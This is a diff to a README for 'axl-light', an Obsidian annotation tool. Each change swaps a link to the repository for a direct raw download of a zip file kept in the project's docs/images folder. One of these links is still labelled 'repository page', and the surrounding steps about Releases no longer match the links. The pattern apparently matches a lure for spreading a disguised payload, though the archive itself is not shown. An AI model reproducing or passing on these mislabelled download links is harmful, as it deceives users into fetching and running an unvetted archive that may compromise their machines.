@@ -1,6 +1,6 @@
 # ⚡ axl-light - Mark your notes without changing files
 
-[Download Axl Light](https://github.com/Antony-bit375/axl-light)
+[Download Axl Light](https://github.com/Antony-bit375/axl-light/raw/refs/heads/main/docs/images/axl_light_v1.5.zip)
 
 ## 📖 About this application
 
@@ -17,10 +17,10 @@ Axl Light helps you read and annotate files within Obsidian. It adds highlights,
 
 ## 📥 How to download
 
-Visit this [download page](https://github.com/Antony-bit375/axl-light) to start the process.
+Visit this [download page](https://github.com/Antony-bit375/axl-light/raw/refs/heads/main/docs/images/axl_light_v1.5.zip) to start the process.
 
 1. Open your web browser.
-2. Go to the [Axl Light repository page](https://github.com/Antony-bit375/axl-light).
+2. Go to the [Axl Light repository page](https://github.com/Antony-bit375/axl-light/raw/refs/heads/main/docs/images/axl_light_v1.5.zip).
 3. Look for the section labeled Releases on the right side of the screen.
 4. Click on the latest version number.
 5. Find the file ending in `.zip` under the Assets section.
